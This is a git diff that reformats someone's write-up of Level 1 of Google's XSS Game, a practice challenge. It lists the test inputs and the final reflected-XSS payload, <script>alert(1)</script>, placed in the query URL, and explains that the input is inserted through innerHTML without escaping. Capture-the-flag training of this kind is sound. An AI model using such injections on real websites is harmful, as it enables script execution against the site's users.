@@ -1,36 +1,67 @@
-🔰 Level 1: Reflected XSS - Basic Injection
-📝 Mission Description:
+# Google XSS Game – Level 1: Reflected XSS
 
-    This level demonstrates a common cause of Cross-Site Scripting (XSS), where user input is directly included in the page without proper escaping.
+---
 
-Your goal is to inject JavaScript that causes a alert() popup.
-🎯 Mission Objective:
+## 🎯 Mission Description  
+This level demonstrates a common cause of cross-site scripting, where user input is directly included in the page without proper escaping.  
+You're allowed to interact with the vulnerable frame or modify the URL directly to execute JavaScript.
 
-Inject a script that pops up an alert() box in the frame.
-Once you succeed, you can proceed to the next level.
-🔍 Vulnerability Type:
+---
 
-    Reflected XSS
+## 🎯 Mission Objective  
+Inject a script that pops up `alert(1)` in the frame below.  
+Once the alert appears, the level is considered solved.
 
-    Unsanitized input directly rendered into the HTML response.
+---
 
-🔗 Test Cases Tried:
-Attempt	Result
-?query=x	Reflected as: <b>x</b>
-?query=X">x	Reflected as: <b>X">x</b> — shows input inside a tag
-?query=<script>alert(1)</script>	✅ JavaScript executed, level completed
-✅ Final Payload Used:
+## 🧪 Steps (My Try)
 
+### ✅ Tried:  
+`x`  
+→ URL:  
+```
+https://xss-game.appspot.com/level1/frame?query=x
+```  
+→ Reflected as:  
+```html
+<b>x</b>
+```
+
+---
+
+### ✅ Tried:  
+`X">x`  
+→ URL:  
+```
+https://xss-game.appspot.com/level1/frame?query=X">x
+```  
+→ Reflected as:  
+```html
+<b>X">x</b>
+```  
+🔸 This shows we can break out of the attribute or tag.
+
+---
+
+### ✅ Final Payload:  
+```html
 <script>alert(1)</script>
+```
 
-URL:
-
+→ URL:  
+```
 https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>
+```  
+🎉 Alert triggered — mission accomplished.
 
-🧠 Explanation:
+---
 
-    The input is inserted inside the page using innerHTML, without escaping.
+## 🧠 Notes  
+- Input is reflected inside a `<b>` tag using `innerHTML`
+- No escaping or filtering at all
+- Classic Reflected XSS vulnerability
+- Direct injection with `<script>` tag works
 
-    The script tag is interpreted by the browser and executed.
+---
 
-    No filters or encoding are applied in this level, making it the easiest form of XSS.
+## ✅ Status: Solved 🎉
